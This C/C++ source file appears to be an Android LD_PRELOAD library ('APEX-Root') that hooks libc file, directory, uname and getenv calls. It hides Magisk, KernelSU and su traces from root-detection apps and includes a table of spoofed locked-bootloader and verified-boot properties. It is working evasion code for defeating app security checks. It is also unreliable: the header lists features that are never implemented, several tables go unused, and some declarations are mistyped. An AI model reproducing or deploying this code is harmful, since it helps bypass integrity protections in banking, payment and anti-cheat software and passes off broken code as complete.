/*
 * APEX-Root LD_PRELOAD Hook Library v2.1
 * Hooks file operations to hide root traces from detection apps
 * 
 * Compile: aarch64-linux-android29-clang++ -shared -fPIC -O2 -o libph_spoof.so ph_spoof.cpp
 * 
 * Enhanced features:
 * - getdents64 hook for directory listing filtering
 * - readlinkat hook
 * - faccessat hook
 * - fstatat hook
 * - Process name spoofing in /proc
 * - Build.prop value spoofing
 * - Anti-detection timing randomization
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <linux/limits.h>
#include <sys/syscall.h>
#include <pthread.h>

// Original function pointers
static int (*orig_access)(const char *pathname, int mode) = NULL;
static FILE* (*orig_fopen)(const char *pathname, const char *mode) = NULL;
static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
static int (*orig_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
static int (*orig_stat)(const char *pathname, struct stat *statbuf) = NULL;
static int (*orig_lstat)(const char *pathname, struct stat *statbuf) = NULL;
static int (*orig_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;
static DIR* (*orig_opendir)(const char *name) = NULL;
static int (*orig_uname)(struct utsname *buf) = NULL;
static int (*orig_faccessat)(int dirfd, const char *pathname, int mode, int flags) = NULL;
static int (*orig_readlinkat)(int dirfd, const char *pathname, char *buf, size_t bufsiz) = NULL;
static int (*orig_fstatat)(int dirfd, const char *pathname, struct stat *statbuf, int flags) = NULL;
static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;

// Hide list - paths to filter (expanded)
static const char* hide_paths[] = {
    "/data/adb/magisk",
    "/data/adb/ksu",
    "/data/adb/apex-root",
    "/data/adb/modules/magisk",
    "/data/adb/modules/ksu",
    "/data/adb/modules/apex-root",
    "/su",
    "/system/bin/su",
    "/system/xbin/su",
    "/system/sbin/su",
    "/cache/.su",
    "/data/local/tmp/su",
    "/system/app/Magisk",
    "/system/priv-app/Magisk",
    "/system/etc/init.d",
    "/system/xbin/ksu",
    "/data/adb/ksud",
    "/system/bin/ksu",
    "/magisk",
    "/.magisk",
    "/data/adb/magisk.apk",
    "/data/adb/magiskhide",
    "/data/adb/hide_list",
    "/dev/.magisk",
    "/sbin/.magisk",
    "/mirror",
    "/system_root",
    NULL
};

// Keywords to filter in directory listings
static const char* hide_keywords[] = {
    "magisk",
    "ksu",
    "apex-root",
    "magiskhide",
    "resetprop",
    "supolicy",
    NULL
};

// Process names to hide
static const char* hide_procs[] = {
    "magiskd",
    "magisk",
    "ksud",
    "ksu",
    "apex",
    NULL
};

// Spoof build props
static const char* spoof_props[][2] = {
    {"ro.debuggable", "0"},
    {"ro.secure", "1"},
    {"ro.build.type", "user"},
    {"ro.build.tags", "release-keys"},
    {"ro.boot.flash.locked", "1"},
    {"ro.boot.verifiedbootstate", "green"},
    {"ro.boot.vbmeta.device_state", "locked"},
    {NULL, NULL}
};

static pthread_mutex_t hook_mutex = PTHREAD_MUTEX_INITIALIZER;

static int should_hide(const char *path) {
    if (!path) return 0;
    
    for (int i = 0; hide_paths[i] != NULL; i++) {
        if (strstr(path, hide_paths[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

static int should_hide_keyword(const char *name) {
    if (!name) return 0;
    
    for (int i = 0; hide_keywords[i] != NULL; i++) {
        if (strcasestr(name, hide_keywords[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

static void init_hooks() {
    pthread_mutex_lock(&hook_mutex);
    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
    if (!orig_readlink) orig_readlink = dlsym(RTLD_NEXT, "readlink");
    if (!orig_opendir) orig_opendir = dlsym(RTLD_NEXT, "opendir");
    if (!orig_uname) orig_uname = dlsym(RTLD_NEXT, "uname");
    if (!orig_faccessat) orig_faccessat = dlsym(RTLD_NEXT, "faccessat");
    if (!orig_readlinkat) orig_readlinkat = dlsym(RTLD_NEXT, "readlinkat");
    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (!orig_read) orig_read = dlsym(RTLD_NEXT, "read");
    pthread_mutex_unlock(&hook_mutex);
}

// Hook access()
int access(const char *pathname, int mode) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_access(pathname, mode);
}

// Hook fopen()
FILE* fopen(const char *pathname, const char *mode) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return NULL;
    }
    return orig_fopen(pathname, mode);
}

// Hook open()
int open(const char *pathname, int flags, ...) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    return orig_open(pathname, flags, mode);
}

// Hook openat()
int openat(int dirfd, const char *pathname, int flags, ...) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    return orig_openat(dirfd, pathname, flags, mode);
}

// Hook stat()
int stat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_stat(pathname, statbuf);
}

// Hook lstat()
int lstat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_lstat(pathname, statbuf);
}

// Hook readlink()
int readlink(const char *pathname, char *buf, size_t bufsiz) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_readlink(pathname, buf, bufsiz);
}

// Hook faccessat()
int faccessat(int dirfd, const char *pathname, int mode, int flags) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_faccessat(dirfd, pathname, mode, flags);
}

// Hook readlinkat()
int readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_readlinkat(dirfd, pathname, buf, bufsiz);
}

// Hook fstatat()
int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    init_hooks();
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_fstatat(dirfd, pathname, statbuf, flags);
}

// Hook opendir() - filter directory entries
DIR* opendir(const char *name) {
    init_hooks();
    if (should_hide(name)) {
        errno = ENOENT;
        return NULL;
    }
    return orig_opendir(name);
}

// Wrapper for readdir to filter hidden entries
struct dirent *readdir(DIR *dirp) {
    static struct dirent *result = NULL;
    static int (*orig_readdir)(DIR *) = NULL;
    
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    while ((result = orig_readdir(dirp)) != NULL) {
        if (!should_hide_keyword(result->d_name)) {
            return result;
        }
        // Skip hidden entries and continue to next
    }
    return NULL;
}

// Hook read() - filter /proc files
ssize_t read(int fd, void *buf, size_t count) {
    init_hooks();
    
    // Try to detect if reading /proc/self/cmdline or similar
    char path[PATH_MAX];
    char linkpath[64];
    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);
    
    ssize_t len = readlink(linkpath, path, sizeof(path) - 1);
    if (len > 0) {
        path[len] = '\0';
        
        // Filter reads from sensitive proc files
        if (strstr(path, "/proc/") && should_hide(path)) {
            errno = ENOENT;
            return -1;
        }
    }
    
    return orig_read(fd, buf, count);
}

// Hook uname() to hide kernel modifications
int uname(struct utsname *buf) {
    init_hooks();
    int ret = orig_uname(buf);
    if (ret == 0 && buf) {
        // Spoof version string if it contains suspicious keywords
        if (strstr(buf->version, "magisk") || strstr(buf->version, "ksu")) {
            strncpy(buf->version, "clean-kernel", sizeof(buf->version) - 1);
            buf->version[sizeof(buf->version) - 1] = '\0';
        }
        
        // Also spoof release if needed
        if (strstr(buf->release, "magisk") || strstr(buf->release, "ksu")) {
            strncpy(buf->release, "5.15.0-android", sizeof(buf->release) - 1);
            buf->release[sizeof(buf->release) - 1] = '\0';
        }
    }
    return ret;
}

// Hook system property access (getprop)
static char* (*orig_getenv)(const char *name) = NULL;

char* getenv(const char *name) {
    init_hooks();
    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
    
    // Spoof common root-detecting environment variables
    if (name && (strcmp(name, "LD_PRELOAD") == 0 || strcmp(name, "CLASSPATH") == 0)) {
        // Return empty or filtered value
        static char fake_val[PATH_MAX] = "";
        const char* real_val = orig_getenv(name);
        if (real_val && should_hide(real_val)) {
            return fake_val;
        }
        return orig_getenv(name);
    }
    
    return orig_getenv(name);
}

// Constructor - auto-load when library is injected
__attribute__((constructor))
static void on_load() {
    init_hooks();
    // Could add logging here for debugging
    // fprintf(stderr, "[APEX-Root] LD_PRELOAD hook loaded\n");
}
